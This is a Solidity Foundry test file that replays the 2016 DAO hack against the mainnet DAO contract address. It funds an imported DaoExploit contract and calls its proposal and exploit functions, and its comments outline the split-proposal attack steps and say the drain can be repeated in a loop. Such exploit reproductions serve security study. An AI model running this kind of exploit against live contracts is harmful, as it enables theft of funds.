// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import { DaoExploit } from "../DaoExploit.sol";
import { Helper, IDAO } from "../Helper.sol";

// Hack @ block 1599207

contract ContractTest is Test {
    DaoExploit daoExploit;
    Helper helper;
    IDAO dao = IDAO(0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413);

    function setUp() public {
        helper = new Helper();
        daoExploit = new DaoExploit(address(helper), 20);
    }

    function testDaoHack() public {
        /*
            1. Participate in Pre-sale
                a. Deploy Hack contract
                b. Deploy DarkDao contract which is same
            2. Transfer DAO to hack contract after 1 day
            3. Make Split proposal
            4. Vote Yes on proposal
            5. call splitDao after 8 days
        */

        // get yourself some dao tokens!
        deal(address(dao), address(daoExploit), 50_000_000 * 1e16);
        console.log(
            "Total Eth (Million) in DaoContract",
            address(dao).balance / 1e18
        );
        daoExploit.createVoteAndExecuteProposal();

        daoExploit.exploit();
        // This attack can be continued in loop in conjuction
        // to another proposal to drain DaoContract indefinately.
    }
}
